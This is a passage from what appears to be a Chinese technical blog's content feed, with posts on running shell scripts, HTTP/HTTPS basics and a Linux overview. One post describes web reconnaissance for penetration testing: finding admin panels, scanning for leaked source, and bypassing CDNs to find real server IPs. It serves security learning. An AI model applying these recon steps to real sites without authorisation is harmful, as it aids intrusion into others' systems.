class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# sh ./hello.txt </span><br><span class="line">hello world</span><br><span class="line">[root@hadoop100 shell]# sh hello.txt </span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><h3 id="（2）sh-脚本的绝对路径"><a href="#（2）sh-脚本的绝对路径" class="headerlink" title="（2）sh + 脚本的绝对路径"></a>（2）sh + 脚本的绝对路径</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# pwd</span><br><span class="line">/root/RupertTears/shell</span><br><span class="line">[root@hadoop100 shell]# sh /root/RupertTears/shell/hello.txt </span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><h3 id="（3）bash-脚本的相对路径"><a href="#（3）bash-脚本的相对路径" class="headerlink" title="（3）bash + 脚本的相对路径"></a>（3）bash + 脚本的相对路径</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# bash ./hello.txt </span><br><span class="line">hello world</span><br><span class="line">[root@hadoop100 shell]# bash hello.txt </span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><h3 id="（4）bash-脚本的绝对路径"><a href="#（4）bash-脚本的绝对路径" class="headerlink" title="（4）bash + 脚本的绝对路径"></a>（4）bash + 脚本的绝对路径</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# pwd</span><br><span class="line">/root/RupertTears/shell</span><br><span class="line">[root@hadoop100 shell]# bash /root/RupertTears/shell/hello.txt </span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><h2 id="2-2-采用输入脚本的绝对路径或相对路径执行脚本（必须具有可执行权限-x）"><a href="#2-2-采用输入脚本的绝对路径或相对路径执行脚本（必须具有可执行权限-x）" class="headerlink" title="2.2 采用输入脚本的绝对路径或相对路径执行脚本（必须具有可执行权限+x）"></a>2.2 采用输入脚本的绝对路径或相对路径执行脚本（必须具有可执行权限+x）</h2><h3 id="（1）绝对路径"><a href="#（1）绝对路径" class="headerlink" title="（1）绝对路径"></a>（1）绝对路径</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# pwd</span><br><span class="line">/root/RupertTears/shell</span><br><span class="line">[root@hadoop100 shell]# ls</span><br><span class="line">hello.txt</span><br><span class="line">[root@hadoop100 shell]# /root/RupertTears/shell/hello.txt</span><br><span class="line">-bash: /root/RupertTears/shell/hello.txt: 权限不够</span><br><span class="line">[root@hadoop100 shell]# chmod +x hello.txt </span><br><span class="line">[root@hadoop100 shell]# ll</span><br><span class="line">总用量 4</span><br><span class="line">-rwxr-xr-x. 1 root root 31 12月 11 14:56 hello.txt</span><br><span class="line">[root@hadoop100 shell]# /root/RupertTears/shell/hello.txt</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><h3 id="（2）相对路径"><a href="#（2）相对路径" class="headerlink" title="（2）相对路径"></a>（2）相对路径</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# ./hello.txt </span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><h2 id="2-3-在脚本的路径前加上“-”或者-source"><a href="#2-3-在脚本的路径前加上“-”或者-source" class="headerlink" title="2.3 在脚本的路径前加上“.”或者 source"></a>2.3 在脚本的路径前加上“.”或者 source</h2><h3 id="（1）新建脚本文件"><a href="#（1）新建脚本文件" class="headerlink" title="（1）新建脚本文件"></a>（1）新建脚本文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# cat test.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">A=97</span><br><span class="line">echo $A</span><br></pre></td></tr></table></figure><h3 id="（2）采用-bash-或-sh-脚本路径，执行脚本文件"><a href="#（2）采用-bash-或-sh-脚本路径，执行脚本文件" class="headerlink" title="（2）采用 bash 或 sh + 脚本路径，执行脚本文件"></a>（2）采用 bash 或 sh + 脚本路径，执行脚本文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# ll</span><br><span class="line">总用量 8</span><br><span class="line">-rwxr-xr-x. 1 root root 31 12月 11 14:56 hello.txt</span><br><span class="line">-rw-r--r--. 1 root root 25 12月 11 15:13 test.sh</span><br><span class="line">[root@hadoop100 shell]# echo $A</span><br><span class="line"></span><br><span class="line">[root@hadoop100 shell]# bash test.sh </span><br><span class="line">97</span><br><span class="line">[root@hadoop100 shell]# echo $A</span><br><span class="line"></span><br><span class="line">[root@hadoop100 shell]# sh test.sh </span><br><span class="line">97</span><br><span class="line">[root@hadoop100 shell]# echo $A</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="（3）采用脚本的绝对路径或者相对路径，执行脚本文件"><a href="#（3）采用脚本的绝对路径或者相对路径，执行脚本文件" class="headerlink" title="（3）采用脚本的绝对路径或者相对路径，执行脚本文件"></a>（3）采用脚本的绝对路径或者相对路径，执行脚本文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# chmod +x test.sh </span><br><span class="line">[root@hadoop100 shell]# ll</span><br><span class="line">总用量 8</span><br><span class="line">-rwxr-xr-x. 1 root root 31 12月 11 14:56 hello.txt</span><br><span class="line">-rwxr-xr-x. 1 root root 25 12月 11 15:13 test.sh</span><br><span class="line">[root@hadoop100 shell]# ./test.sh </span><br><span class="line">97</span><br><span class="line">[root@hadoop100 shell]# echo $A</span><br><span class="line"></span><br><span class="line">[root@hadoop100 shell]# pwd</span><br><span class="line">/root/RupertTears/shell</span><br><span class="line">[root@hadoop100 shell]# /root/RupertTears/shell/test.sh </span><br><span class="line">97</span><br><span class="line">[root@hadoop100 shell]# echo $A</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="（4）采用-source-或-“-”-执行"><a href="#（4）采用-source-或-“-”-执行" class="headerlink" title="（4）采用 source 或 “.” 执行"></a>（4）采用 source 或 “.” 执行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# source test.sh </span><br><span class="line">97</span><br><span class="line">[root@hadoop100 shell]# echo $A</span><br><span class="line">97</span><br><span class="line">[root@hadoop100 shell]# vim test.sh </span><br><span class="line">[root@hadoop100 shell]# cat test.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">A=99</span><br><span class="line">echo $A</span><br><span class="line">[root@hadoop100 shell]# . test.sh </span><br><span class="line">99</span><br><span class="line">[root@hadoop100 shell]# echo $A</span><br><span class="line">99</span><br></pre></td></tr></table></figure><h1 id="三：执行方式的区别"><a href="#三：执行方式的区别" class="headerlink" title="三：执行方式的区别"></a>三：执行方式的区别</h1><ul><li>采用 bash 或者 sh + 脚本路径执行，本质上是在当前的 shell 中，打开了一个子 shell 来执行脚本，bash 解析器来执行该脚本，所以脚本本身不需要执行权限；当脚本执行完毕后，子 shell 关闭，回到父 shell 中；</li><li>采用脚本的绝对路径或相对路径，本质上是脚本需要自己执行，所以需要执行权限；</li><li>采用 “.”或者 source 的方式，使脚本在当前的shell中执行，无需打开子 shell ！这就是为什么我们每次修改完 &#x2F;etc&#x2F;profile 文件后，需要 source 一下的原因。</li><li>开启子 shell 与不开启子 shell 的区别就在于环境变量的继承关系，若在子 shell 中设置当前变量，在父 shell 中是不可见的。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell 概述</title>
      <link href="/blog/68a064f8.html/"/>
      <url>/blog/68a064f8.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：概述"><a href="#一：概述" class="headerlink" title="一：概述"></a>一：概述</h1><ul><li>Shell 是一个命令行解释器，它接收应用程序或者用户命令，然后调用操作系统内核。</li><li>Shell 还是一个功能强大的编程语言，易编写、易调试、灵活性强。</li></ul><img src="/blog/68a064f8.html/image-20221210120049097.png" style="zoom:67%;"><h1 id="二：常识"><a href="#二：常识" class="headerlink" title="二：常识"></a>二：常识</h1><h2 id="2-1-Linux-提供的-Shell-解释器"><a href="#2-1-Linux-提供的-Shell-解释器" class="headerlink" title="2.1 Linux 提供的 Shell 解释器"></a>2.1 Linux 提供的 Shell 解释器</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# cat /etc/shells </span><br><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/usr/bin/sh</span><br><span class="line">/usr/bin/bash</span><br><span class="line">/bin/tcsh</span><br><span class="line">/bin/csh</span><br></pre></td></tr></table></figure><h2 id="2-2-bash-和-sh-的关系"><a href="#2-2-bash-和-sh-的关系" class="headerlink" title="2.2 bash 和 sh 的关系"></a>2.2 bash 和 sh 的关系</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# ls -l /bin/ | grep bash</span><br><span class="line">-rwxr-xr-x. 1 root root     964536 4月   1 2020 bash</span><br><span class="line">lrwxrwxrwx. 1 root root         10 12月  3 13:16 bashbug -&gt; bashbug-64</span><br><span class="line">-rwxr-xr-x. 1 root root       6964 4月   1 2020 bashbug-64</span><br><span class="line">lrwxrwxrwx. 1 root root          4 12月  3 13:16 sh -&gt; bash</span><br></pre></td></tr></table></figure><h2 id="2-3-Centos-默认解释器"><a href="#2-3-Centos-默认解释器" class="headerlink" title="2.3 Centos 默认解释器"></a>2.3 Centos 默认解释器</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# echo $SHELL</span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全 信息收集</title>
      <link href="/blog/7e9dc4c3.html/"/>
      <url>/blog/7e9dc4c3.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：敏感文件扫描"><a href="#一：敏感文件扫描" class="headerlink" title="一：敏感文件扫描"></a>一：敏感文件扫描</h1><p>扫描目标网站敏感文件也是信息收集中重要的一步。如果能找到源码泄露，我们可以进一步配合代码审计工具来寻找漏洞。常见的源码泄露有.get，.svn，rar等；</p><h1 id="二：寻找网站后台"><a href="#二：寻找网站后台" class="headerlink" title="二：寻找网站后台"></a>二：寻找网站后台</h1><h2 id="2-1-网站后台简介"><a href="#2-1-网站后台简介" class="headerlink" title="2.1 网站后台简介"></a>2.1 网站后台简介</h2><p>网站后台管理系统：主要用于对网站前台的信息管理，如文字，图片，影音和其他日常使用的文件发布、更新、删除等操作，同时也包含用户信息、订单信息、访客信息的统计和管理。</p><p>简单来说就是对网站数据库的文件的快速操作和管理系统，以使得前台内容能够及时更新和调整。</p><h2 id="2-2-网站后台的寻找方式"><a href="#2-2-网站后台的寻找方式" class="headerlink" title="2.2 网站后台的寻找方式"></a>2.2 网站后台的寻找方式</h2><h3 id="（1）通过-robots-txt-文件寻找"><a href="#（1）通过-robots-txt-文件寻找" class="headerlink" title="（1）通过 robots.txt 文件寻找"></a>（1）通过 robots.txt 文件寻找</h3><p>该文件用于限制一些爬虫爬取目录文件，可以向这个文件中写入规则让爬虫无法爬取。若此文件中有限制网站后台的爬取，我们可以通过它限制的目录来找到网站后台的路径。</p><h3 id="（2）通过谷歌语法寻找"><a href="#（2）通过谷歌语法寻找" class="headerlink" title="（2）通过谷歌语法寻找"></a>（2）通过谷歌语法寻找</h3><p>结合 site + inurl&#x2F;intext&#x2F;intitle 我们也行能够找到目标网站后台。</p><h3 id="（3）查看网站底部管理入口"><a href="#（3）查看网站底部管理入口" class="headerlink" title="（3）查看网站底部管理入口"></a>（3）查看网站底部管理入口</h3><p>我们可以查看网站页面底部和网站版权信息，看看会不会有网站后台入口和版权网站信息，如果有网站后台入口，我们便可以直接找到后台。</p><h3 id="（4）尝试请求不存在的错误路径"><a href="#（4）尝试请求不存在的错误路径" class="headerlink" title="（4）尝试请求不存在的错误路径"></a>（4）尝试请求不存在的错误路径</h3><p>通过这样的方式寻找有没有可能爆出一些网站路径，进一步发现网站后台。</p><h3 id="（5）在线网站指纹识别"><a href="#（5）在线网站指纹识别" class="headerlink" title="（5）在线网站指纹识别"></a>（5）在线网站指纹识别</h3><p>通过在线网站识别目标CMS指纹，进一步寻找目标后台。</p><h3 id="（6）猜测常见后台路径"><a href="#（6）猜测常见后台路径" class="headerlink" title="（6）猜测常见后台路径"></a>（6）猜测常见后台路径</h3><p>尝试在主站后方跟上一些常见路径，比如admin、login、system、admin&#x2F;login、admin_login等，有些网站可能会使用这些默认路径。</p><h3 id="（7）字典爆破后台路径"><a href="#（7）字典爆破后台路径" class="headerlink" title="（7）字典爆破后台路径"></a>（7）字典爆破后台路径</h3><p>通过使用御剑&#x2F;dirsearch等工具来扫描目标后台。</p><h3 id="（8）目标子域名寻找"><a href="#（8）目标子域名寻找" class="headerlink" title="（8）目标子域名寻找"></a>（8）目标子域名寻找</h3><p>有的网站后台可能是在子域名上面，所以不要忘记子域名的寻找。</p><h3 id="（9）js文件寻找"><a href="#（9）js文件寻找" class="headerlink" title="（9）js文件寻找"></a>（9）js文件寻找</h3><p>通过F12打开开发者工具，我们可以看见html代码中的一些js文件。除了框架自带的js文件，有些是网站后期开发的。对于这些文件，我们可以利用脚本去爬取js文件中的一些接口，然后对这些接口做检测，扩大我们的攻击面。</p><h1 id="三：寻找真实IP"><a href="#三：寻找真实IP" class="headerlink" title="三：寻找真实IP"></a>三：寻找真实IP</h1><h2 id="3-1-绕过CDN寻找真实IP"><a href="#3-1-绕过CDN寻找真实IP" class="headerlink" title="3.1 绕过CDN寻找真实IP"></a>3.1 绕过CDN寻找真实IP</h2><h3 id="（1）CDN简介"><a href="#（1）CDN简介" class="headerlink" title="（1）CDN简介"></a>（1）CDN简介</h3><p>CDN，即内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题。</p><p>简单来说就是一组在不同运营商之间的对接节点上的高速缓存服务器，把用户经常访问的静态数据资源直接缓存在CDN服务器上，当用户再次请求时，会直接分发在离用户近的节点服务器上响应给用户，当用户有实际数据交互时，才会从远程web服务器上响应。</p><h3 id="（2）判断目标是否使用CDN"><a href="#（2）判断目标是否使用CDN" class="headerlink" title="（2）判断目标是否使用CDN"></a>（2）判断目标是否使用CDN</h3><ul><li>直接ping域名</li><li>在线网站 <a href="http://17ce.com/">http://17ce.com/</a> 对比ping出的结果，查看这些 IP 是否一致，如果都是一样，即有可能不存在CDN。如果IP地址很多，则大概率存在CDN。</li></ul><h3 id="（3）绕过CDN寻找真实IP方法"><a href="#（3）绕过CDN寻找真实IP方法" class="headerlink" title="（3）绕过CDN寻找真实IP方法"></a>（3）绕过CDN寻找真实IP方法</h3><ol><li>扫描子域名寻找真实IP</li><li>国外网站多地ping <a href="http://asm.ca.com/">http://asm.ca.com</a></li><li>查询历史域名解析记录<ul><li><a href="https://www.netcraft.com/">https://www.netcraft.com/</a></li><li><a href="https://x.threadbook.cn/">https://x.threadbook.cn/</a></li></ul></li><li>phpinfo信息泄露寻找真实IP，server_addr记录了服务器的真实IP。</li></ol><h1 id="四：工具型站点"><a href="#四：工具型站点" class="headerlink" title="四：工具型站点"></a>四：工具型站点</h1><p>在渗透中，我们会经常使用一些工具型网站来收集信息，利用这些工具型站点我们能够快速的得到一些有用信息。</p><h2 id="4-1-云悉"><a href="#4-1-云悉" class="headerlink" title="4.1 云悉"></a>4.1 云悉</h2><ul><li><a href="http://www.yunsee.cn/">http://www.yunsee.cn</a></li><li>利用这个网站来快速收集对方网站的指纹信息，域名信息，ip信息，子域名等。</li></ul><h2 id="4-2-在线指纹识别"><a href="#4-2-在线指纹识别" class="headerlink" title="4.2 在线指纹识别"></a>4.2 在线指纹识别</h2><ul><li><a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a></li><li>利用这个网站来扫描对方网站指纹信息</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络 Http协议</title>
      <link href="/blog/48907d56.html/"/>
      <url>/blog/48907d56.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：基础部分"><a href="#一：基础部分" class="headerlink" title="一：基础部分"></a>一：基础部分</h1><h2 id="1-1-万维网"><a href="#1-1-万维网" class="headerlink" title="1.1 万维网"></a>1.1 万维网</h2><ul><li>三大构建技术（基本组成部分）<ul><li>URL：统一资源定位器</li><li>HTTP协议</li><li>HTML：超文本标识语言</li></ul></li></ul><p>HTML好比是一座座房子，URL是房子的门牌号，HTTP协议就连接房子的道路；这样就形成了一个点对点沟通的通信方式，完成通信闭环。</p><h2 id="1-2-Http协议简介"><a href="#1-2-Http协议简介" class="headerlink" title="1.2 Http协议简介"></a>1.2 Http协议简介</h2><p>超文本传输协议（HyperText Transfer Protocol，缩写：HTTP）是一种用于分布式、协作式和超媒体信息系统的应用协议。</p><p>HTTP是万维网的数据通信的基础。</p><h2 id="1-3-Http协议概述"><a href="#1-3-Http协议概述" class="headerlink" title="1.3 Http协议概述"></a>1.3 Http协议概述</h2><p>HTTP是一个客户端（终端用户）和服务器端（网站）请求和应答的标准。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">例如：通过使用浏览器，客户端发起一个HTTP请求到服务器上的指定端口（默认端口号：80）。</span><br><span class="line"></span><br><span class="line">我们称之为这个客户端为用户代理程序（User Agent）；</span><br><span class="line"></span><br><span class="line">应答的服务器上存储着一些资源，比如HTML文件和图像，我们称这个应答服务器为源服务器（Origin Server）；</span><br><span class="line"></span><br><span class="line">在用户代理和源服务器中间可能存在多个“中间层”，比如代理服务器、网关、隧道；</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">通常，由HTTP客户端发起一个请求，创建一个到服务器指定端口的TCP连接。</span><br><span class="line">HTTP服务器在该端口监听客户端请求。</span><br><span class="line">一旦收到请求，服务器会向客户端返回一个状态，比如&quot;HTTP/1.1 OK&quot;，以及返回的内容，如请求的文件、错误消息及其他信息。</span><br></pre></td></tr></table></figure><h2 id="1-4-URI-URL-URN"><a href="#1-4-URI-URL-URN" class="headerlink" title="1.4 URI URL URN"></a>1.4 URI URL URN</h2><p>URI 包括 URL 和 URN 两个类别，URL 是 URI的子集；</p><p>因此URL一定是URI，而URI不一定是URL；</p><ul><li><strong>URI</strong> &#x3D; Universal Resource Identifier 统一资源标志符，用来标识抽象或物理资源的一个紧凑字符串</li><li><strong>URL</strong> &#x3D; Universal Resource Locator 统一资源定位符，一种定位资源的主要访问机制的字符串</li><li><strong>URN</strong> &#x3D; Universal Resource Name 统一资源名称，通过特定命名空间中的唯一名称或ID来标识资源。</li></ul><img src="/blog/48907d56.html/image-20221206142555044.png" alt="image-20221206142555044" style="zoom: 33%;"><hr><p>举个栗子：URN就是身份证，URL是家庭住址；URN可以标识一个人，而快递员可以通过URL把货送到你手上；</p><p>再举个栗子：<a href="http://aiyingke.cn/blog/48907d56.html/">计算机网络 Http协议 | 爱影客</a> 是个URL，通过这个链接可以告诉CDN（内容分发网络）找到这篇博客的所在地，并且还可以告知用HTTP协议访问。</p><h1 id="二：Http工作原理"><a href="#二：Http工作原理" class="headerlink" title="二：Http工作原理"></a>二：Http工作原理</h1><p>Http协议定义Web客户端，如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。Http协议采用了请求&#x2F;响应模型。</p><p>客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。</p><p>服务器以一个状态行为作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。</p><h1 id="三：Http工作流程"><a href="#三：Http工作流程" class="headerlink" title="三：Http工作流程"></a>三：Http工作流程</h1><ol><li><strong>客户端连接到Web服务器</strong><ul><li>一个HTTP客户端，通常为浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。例如，<a href="http://aiyingke.cn./">http://aiyingke.cn。</a></li></ul></li><li><strong>发送HTTP请求</strong><ul><li>通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4部分组成。</li></ul></li><li><strong>服务器接受请求并返回HTTP响应</strong><ul><li>Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据4部分组成。</li></ul></li><li><strong>释放连接TCP连接</strong><ul><li>若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接；</li><li>connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求；</li></ul></li><li><strong>客户端浏览器解析HTML内容</strong><ul><li>客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。</li></ul></li></ol><h1 id="四：Http-请求方式"><a href="#四：Http-请求方式" class="headerlink" title="四：Http 请求方式"></a>四：Http 请求方式</h1><h2 id="4-1-GET"><a href="#4-1-GET" class="headerlink" title="4.1 GET"></a>4.1 <strong>GET</strong></h2><p>向指定的资源发出“显示”请求。使用GET方法应该只用在读取数据，而不应当被用于产生“副作用”的操作中，比如被网络爬虫所攻击；</p><h2 id="4-2-HEAD"><a href="#4-2-HEAD" class="headerlink" title="4.2 HEAD"></a>4.2 <strong>HEAD</strong></h2><p>与GET方法一样，都是向服务器发出指定资源的请求。只不过服务器将不传回资源的本文部分。它的好处在于，使用这个方法可以在不必传输全部内容的情况下，就可以获取其中“关于该资源的信息”（元信息或称元数据）。</p><h2 id="4-3-POST"><a href="#4-3-POST" class="headerlink" title="4.3 POST"></a>4.3 <strong>POST</strong></h2><p>向指定资源提交数据，请求服务器进行处理（例如提交表单或者上传文件）。数据被包含在请求本文中。这个请求可能会创建新的资源或修改现有资源，或二者皆有。</p><h2 id="4-4-PUT"><a href="#4-4-PUT" class="headerlink" title="4.4 PUT"></a>4.4 <strong>PUT</strong></h2><p>向指定资源位置上传其最新内容。</p><h2 id="4-5-DELETE"><a href="#4-5-DELETE" class="headerlink" title="4.5 DELETE"></a>4.5 <strong>DELETE</strong></h2><p>请求服务器删除Request-URI所标识的资源。</p><h2 id="4-6-TRACE"><a href="#4-6-TRACE" class="headerlink" title="4.6 TRACE"></a>4.6 <strong>TRACE</strong></h2><p>回显服务器收到的请求，主要用于测试或诊断。</p><h2 id="4-7-OPTIONS"><a href="#4-7-OPTIONS" class="headerlink" title="4.7 OPTIONS"></a>4.7 <strong>OPTIONS</strong></h2><p>这个方法可使服务器传回该资源所支持的所有HTTP请求方法。用’*’来代替资源名称，向Web服务器发送OPTIONS请求，可以测试服务器功能是否正常运作。</p><h2 id="4-8-CONNECT"><a href="#4-8-CONNECT" class="headerlink" title="4.8 CONNECT"></a>4.8 <strong>CONNECT</strong></h2><p>HTTP&#x2F;1.1协议中预留给能够将连接改为管道方式的代理服务器。通常用于SSL加密服务器的链接（经由非加密的HTTP代理服务器）。</p><h1 id="五：Http-响应状态码"><a href="#五：Http-响应状态码" class="headerlink" title="五：Http 响应状态码"></a>五：Http 响应状态码</h1><p>所有HTTP响应的第一行都是状态行，依次是当前HTTP版本号，3位数字组成的状态代码，以及描述状态的短语，彼此由空格分隔。</p><p><img src="/blog/48907d56.html/image-20221206173750611.png"></p><h1 id="六：Https-协议"><a href="#六：Https-协议" class="headerlink" title="六：Https 协议"></a>六：Https 协议</h1><h2 id="6-1-基础常识"><a href="#6-1-基础常识" class="headerlink" title="6.1 基础常识"></a>6.1 基础常识</h2><ul><li>HTTP默认端口的80，HTTPS的默认端口是443</li><li>HTTPS 可看作是 HTTP + TLS(层),TLS是运行在TCP之上的，所有的内容都经过加密。</li><li>HTTPS使用了对称加密和非对称加密混合使用的方式</li></ul><h2 id="6-2-工作流程"><a href="#6-2-工作流程" class="headerlink" title="6.2 工作流程"></a>6.2 工作流程</h2><p><strong>HTTPS 在内容传输的加密上使用的是对称加密，非对称加密只作用在证书验证阶段。</strong></p><ul><li>证书验证阶段：<ul><li>浏览器发起https请求；</li><li>服务器接收到请求，返回https证书；</li><li>客户端验证证书是否合法，若不合法则提示警告；</li></ul></li><li>数据传输阶段：<ul><li>当证书验证合法后，浏览器在本地生成随机数；</li><li>通过公钥加密随机数，并把加密后的随机数传输到服务器；</li><li>服务器通过私钥对随机数进行解密；</li><li>服务器通过随机数构造对称机密算法，对数据进行加密后传输给浏览器。</li></ul></li></ul><p><img src="/blog/48907d56.html/image-20221206182639769.png"></p><h2 id="6-3-为什么需要证书认证？"><a href="#6-3-为什么需要证书认证？" class="headerlink" title="6.3 为什么需要证书认证？"></a>6.3 为什么需要证书认证？</h2><ul><li><p>基于安全考虑，在非对称加密阶段是需要传输公钥的，传输公钥的过程中；一旦存在中间人攻击，把公钥替换了，被攻击机拿到了假公钥去加密数据，之后中间人再利用私钥去解密，照样是不安全的。</p></li><li><p>证书认证的作用就是为了分辨对方是不是中间人黑客！</p></li><li><p>举个栗子：生活中，有公证中心这样的概念，因为它公信力强大家才去相信他，公证中心给每一个颁布一个证书，以此标识一个人的身份，这个证书中除了个人的基本信息，还包括公钥！</p></li><li><p>那么如何去保证证书的安全传输问题呢？解决的方案是数字签名。</p></li><li><p>数字签名的核心思想：把公钥和个人信息通过Hash算法转换成消息摘要。</p></li><li><p>这样即使遇见中间人攻击，也很难去修改签名。即使中间人黑客将消息摘要中的个人信息替换为自己的，将会导致消息摘要产生巨大的变动，这样便失去了我们的信任。</p></li><li><p>这样就无懈可击了嘛？不是的，倘若中间人黑客把整个消息摘要都替换了呢？</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 思维导图</title>
      <link href="/blog/829e9d92.html/"/>
      <url>/blog/829e9d92.html/</url>
      
        <content type="html"><![CDATA[<p><img src="/blog/829e9d92.html/image-20221204194152821.png"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 软件包管理</title>
      <link href="/blog/88d9b703.html/"/>
      <url>/blog/88d9b703.html/</url>
      
